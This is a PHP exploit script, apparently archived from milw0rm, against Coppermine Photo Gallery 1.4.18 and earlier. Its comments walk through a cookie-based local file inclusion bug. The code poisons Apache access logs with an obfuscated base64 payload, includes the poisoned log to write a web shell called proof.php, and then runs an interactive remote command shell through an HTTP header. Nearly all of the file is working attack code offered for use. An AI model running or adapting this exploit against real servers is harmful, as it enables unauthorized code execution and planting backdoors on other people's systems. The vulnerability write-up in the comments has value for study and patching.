<?php

/*
	----------------------------------------------------------------------
	Coppermine Photo Gallery <= 1.4.18 LFI / Remote Code Execution Exploit
	----------------------------------------------------------------------
	
	author...: EgiX
	mail.....: n0b0d13s[at]gmail[dot]com
	
	link.....: http://coppermine-gallery.net/
	dork.....: "Powered by Coppermine Photo Gallery"

	[-] vulnerable code to LFI in /include/init.inc.php
	
	263.	// Start output buffering
	264.	ob_start('cpg_filter_page_html');
	265.	
	266.	// Parse cookie stored user profile
	267.	user_get_profile(); <==== [1]
	268.	
	269.	// Authenticate
	270.	$cpg_udb->authenticate();
	
	[...]
	
	301.	// Process language selection if present in URI or in user profile or try
	302.	// autodetection if default charset is utf-8
	303.	if (!empty($_GET['lang']))
	304.	{
	305.	        $USER['lang'] = ereg("^[a-z0-9_-]*$", $_GET['lang']) ? $_GET['lang'] : $CONFIG['lang'];
	306.	}
	307.	
	308.	if (isset($USER['lang']) && !strstr($USER['lang'], '/') && file_exists('lang/' . $USER['lang'] . '.php'))
	309.	{
	310.	        $CONFIG['default_lang'] = $CONFIG['lang'];          // Save default language
	311.	        $CONFIG['lang'] = strtr($USER['lang'], '$/\\:*?"\'<>|`', '____________');
	312.	}
	313.	elseif ($CONFIG['charset'] == 'utf-8') <====== [2]
	314.	{
	315.	        include('include/select_lang.inc.php');
	316.	        if (file_exists('lang/' . $USER['lang'] . '.php'))
	317.	        {
	318.	                $CONFIG['default_lang'] = $CONFIG['lang'];      // Save default language
	319.	                $CONFIG['lang'] = $USER['lang'];
	320.	        }
	321.	}
	322.	else
	323.	{
	324.	        unset($USER['lang']);
	325.	}
	326.	
	327.	if (isset($CONFIG['default_lang']) && ($CONFIG['default_lang']==$CONFIG['lang']))
	328.	{
	329.	                unset($CONFIG['default_lang']);
	330.	}
	331.	
	332.	if (!file_exists("lang/{$CONFIG['lang']}.php"))
	333.	  $CONFIG['lang'] = 'english';
	334.	
	335.	// We load the chosen language file
	336.	require "lang/{$CONFIG['lang']}.php"; <======== [3]

	if $CONFIG['charset'] is set to 'utf-8' [2] (this is the default configuration), an attacker could be able to
	include an arbitrary local file through the require() at line 336 [3], due to $USER array can be manipulate by
	cookies (see user_get_profile() function [1] defined into /include/functions.inc.php, near lines 128-146)
	
	[-] Path disclosure in /themes/sample/theme.php
	
	[-] Possible bug fix in /include/functions.inc.php
	
	128.	function user_get_profile()
	129.	{
	130.	        global $CONFIG, $USER;
	131.			
	132.		if (isset($_COOKIE[$CONFIG['cookie_name'].'_data'])) {
	133.			$USER = @unserialize(@base64_decode($_COOKIE[$CONFIG['cookie_name'].'_data']));
	134.			$USER['lang'] = ereg("^[a-z0-9_-]*$", $USER['lang']) ? $USER['lang'] : $CONFIG['lang'];
	135.	       	}
	
*/

error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);

define(STDIN, fopen("php://stdin", "r"));

function http_send($host, $packet)
{
	$sock = fsockopen($host, 80);
	while (!$sock)
	{
		print "\n[-] No response from {$host}:80 Trying again...";
		$sock = fsockopen($host, 80);
	}
	fputs($sock, $packet);
	while (!feof($sock)) $resp .= fread($sock, 1024);
	fclose($sock);
	return $resp;
}

function get_info()
{
	global $host, $path, $cookie, $version, $path_disc;
	
	$packet  = "GET {$path} HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Connection: close\r\n\r\n";
	$html	 = http_send($host, $packet);
	
	preg_match("/Set-Cookie: (.*)_data/", $html, $match);
	$cookie = $match[1];
	
	preg_match("/<!--Coppermine Photo Gallery (.*) /", $html, $match);
	$version = $match[1];
	
	$packet  = "GET {$path}themes/sample/theme.php HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Connection: close\r\n\r\n";
	
	preg_match("/in <b>(.*)themes/", http_send($host, $packet), $match);
	$path_disc = $match[1];
}

function get_logs()
{
	$logs[] = "/apache/logs/access.log";
	$logs[] = "/apache2/logs/access.log";
	$logs[] = "/apache/log/access.log";
	$logs[] = "/apache2/log/access.log";
	$logs[] = "/logs/access.log";
	$logs[] = "/var/log/apache/access.log";
	$logs[] = "/var/log/apache2/access.log";
	$logs[] = "/var/log/access.log";
	$logs[] = "/var/www/logs/access.log";
	$logs[] = "/var/www/log/access.log";
	$logs[] = "/var/log/httpd/access.log";
	$logs[] = "/etc/httpd/logs/access.log";
	$logs[] = "/usr/local/apache/logs/access.log";
	$logs[] = "/usr/local/apache2/logs/access.log";
	
	for ($i = 0, $climb = "../.."; $i < 7; $i++)
	{
		foreach ($logs as $_log) $array[] = $climb.$_log;
		$climb .= "/..";
	}
	
	return $array;
}

function first_time()
{
	global $host, $path;
	
	$packet  = "GET {$path}proof.php HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "Connection: close\r\n\r\n";

	return (!preg_match("/_code_/", http_send($host, $packet)));
}

function lfi()
{
	global $host, $path, $cookie;
	
	$logs = get_logs();

	foreach ($logs as $_log)
	{
		print "[-] Trying to include {$_log}\n";
		
		$data = base64_encode(serialize(array("ID" => md5(time()), "am" => 1, "lang" => $_log.chr(0))));
		
		$packet	 = "GET {$path} HTTP/1.0\r\n";
		$packet .= "Host: {$host}\r\n";
		$packet .= "Cookie: {$cookie}_data={$data}\r\n";
		$packet .= "Connection: close\r\n\r\n";
		$resp	 = http_send($host, $packet);
		
		if (!preg_match("/f=fopen/", $resp) && preg_match("/_LfI_/", $resp)) return true;
		
		sleep(1);
	}
	
	return false;
}

print "\n+-------------------------------------------------------------------------+";
print "\n| Coppermine Photo Gallery <= 1.4.18 LFI / Code Execution Exploit by EgiX |";
print "\n+-------------------------------------------------------------------------+\n";

if ($argc < 3)
{
	print "\nUsage...: php $argv[0] host path\n";
	print "\nhost....: target server (ip/hostname)";
	print "\npath....: path to cpg directory\n";
	die();
}

$host = $argv[1];
$path = $argv[2];

get_info();

print "\n[-] Version..........: {$version}";
print "\n[-] Cookie name......: {$cookie}";
print "\n[-] Path disclosure..: {$path_disc}\n\n";

if (first_time())
{
	$code = base64_decode(
	"PD9waHA7JGY9Zm9wZW4oY2hyKDExMikuY2hyKDExNCkuY2hyKDExMSkuY2hyKDExMSkuY2hyKDEwMikuY2hyKDQ2KS5jaHIoM" .
	"TEyKS5jaHIoMTA0KS5jaHIoMTEyKSxjaHIoMTE5KSk7ZndyaXRlKCRmLGNocig2MCkuY2hyKDYzKS5jaHIoMTEyKS5jaHIoMT" .
	"A0KS5jaHIoMTEyKS5jaHIoMzIpLmNocigxMDEpLmNocig5OSkuY2hyKDEwNCkuY2hyKDExMSkuY2hyKDMyKS5jaHIoMzkpLmN" .
	"ocig5NSkuY2hyKDk5KS5jaHIoMTExKS5jaHIoMTAwKS5jaHIoMTAxKS5jaHIoOTUpLmNocigzOSkuY2hyKDU5KS5jaHIoMzIp" .
	"LmNocigxMTIpLmNocig5NykuY2hyKDExNSkuY2hyKDExNSkuY2hyKDExNikuY2hyKDEwNCkuY2hyKDExNCkuY2hyKDExNykuY" .
	"2hyKDQwKS5jaHIoOTgpLmNocig5NykuY2hyKDExNSkuY2hyKDEwMSkuY2hyKDU0KS5jaHIoNTIpLmNocig5NSkuY2hyKDEwMC" .
	"kuY2hyKDEwMSkuY2hyKDk5KS5jaHIoMTExKS5jaHIoMTAwKS5jaHIoMTAxKS5jaHIoNDApLmNocigzNikuY2hyKDk1KS5jaHI" .
	"oODMpLmNocig2OSkuY2hyKDgyKS5jaHIoODYpLmNocig2OSkuY2hyKDgyKS5jaHIoOTEpLmNocigzOSkuY2hyKDcyKS5jaHIo" .
	"ODQpLmNocig4NCkuY2hyKDgwKS5jaHIoOTUpLmNocig2NykuY2hyKDc3KS5jaHIoNjgpLmNocigzOSkuY2hyKDkzKS5jaHIoN" .
	"DEpLmNocig0MSkuY2hyKDU5KS5jaHIoMzIpLmNocig2MykuY2hyKDYyKSk7ZmNsb3NlKCRmKTtkaWUoX0xmSV8pOz8+");
		
	$packet  = "GET {$path}{$code} HTTP/1.0\r\n";
	$packet .= "Host: {$host}\r\n";
	$packet .= "User-Agent: {$code}\r\n";
	$packet .= "Connection: close\r\n\r\n";

	http_send($host, $packet);

	if (!lfi()) die("\n[-] Exploit failed...\n");
}

while(1)
{
	print "\ncoppermine-shell# ";
	$cmd = trim(fgets(STDIN));
	if ($cmd != "exit")
	{
		$packet = "GET {$path}proof.php HTTP/1.0\r\n";
		$packet.= "Host: {$host}\r\n";
		$packet.= "Cmd: ".base64_encode($cmd)."\r\n";
		$packet.= "Connection: close\r\n\r\n";
		list($header, $payload) = explode("_code_", http_send($host, $packet));
		preg_match("/200 OK/", $header) ? print "\n{$payload}" : die("\n[-] Exploit failed...\n");
	}
	else break;
}

?>

# milw0rm.com [2008-07-31]
